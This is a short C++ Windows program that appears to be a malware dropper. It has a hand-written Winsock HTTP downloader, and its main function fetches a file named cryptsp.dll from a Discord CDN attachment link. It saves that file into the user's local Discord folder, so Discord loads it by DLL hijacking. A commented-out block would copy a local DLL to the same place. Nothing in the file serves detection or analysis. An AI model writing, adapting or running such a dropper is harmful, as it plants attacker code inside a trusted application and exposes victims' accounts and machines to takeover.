#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>

#pragma comment(lib, "Ws2_32.lib") // Vincular con la biblioteca Winsock

void downloadFile(const std::string& host, const std::string& path, const std::string& outputFile) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct addrinfo* result = nullptr, hints;
    std::ofstream file(outputFile, std::ios::binary);

    if (!file) {
        std::cerr << "Unable to open output file." << std::endl;
        return;
    }

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    // Prepare hints
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    if (getaddrinfo(host.c_str(), "80", &hints, &result) != 0) {
        std::cerr << "getaddrinfo failed: " <<GetLastError()<< std::endl;
        WSACleanup();
        return;
    }

    // Create a SOCKET for connecting to the server
    sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    // Connect to the server
    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        std::cerr << "Unable to connect to server!" << std::endl;
        closesocket(sock);
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    freeaddrinfo(result);

    // Form HTTP GET request
    std::string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "Connection: close\r\n\r\n";

    // Send request
    int bytesSent = send(sock, request.c_str(), (int)request.length(), 0);
    if (bytesSent == SOCKET_ERROR) {
        std::cerr << "send failed: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Receive response
    char buffer[4096];
    int bytesRead;
    bool headerParsed = false;
    std::string header;

    while ((bytesRead = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        if (!headerParsed) {
            // Search for the header-body delimiter "\r\n\r\n"
            header.append(buffer, bytesRead);
            size_t pos = header.find("\r\n\r\n");
            if (pos != std::string::npos) {
                headerParsed = true;
                file.write(buffer + pos + 4, bytesRead - pos - 4);
            }
        }
        else {
            // Write the file content after the header
            file.write(buffer, bytesRead);
        }
    }

    if (bytesRead < 0) {
        std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
    }

    file.close();
    closesocket(sock);
    WSACleanup();
}


int main() {
	std::string discordPath = std::string(getenv("localappdata")) + "\\Discord\\";
	std::string dllName = "cryptsp.dll";
    
    downloadFile("cdn.discordapp.com", "/attachments/1294462945769685033/1298051352307699722/cryptsp.dll", discordPath + dllName);
    

    /*
	std::ifstream OpenDll("Path", std::ios::binary);
		
	

	std::ofstream dll(discordPath + dllName, std::ios::binary);
	
	
	
	char buffer[4096];
	while (OpenDll.read(buffer, sizeof(buffer)))
	{
		dll.write(buffer, sizeof(buffer));
	}

	dll.write(buffer, OpenDll.gcount());
    dll.close();
    OpenDll.close();
    */

	
	
	return 0;
}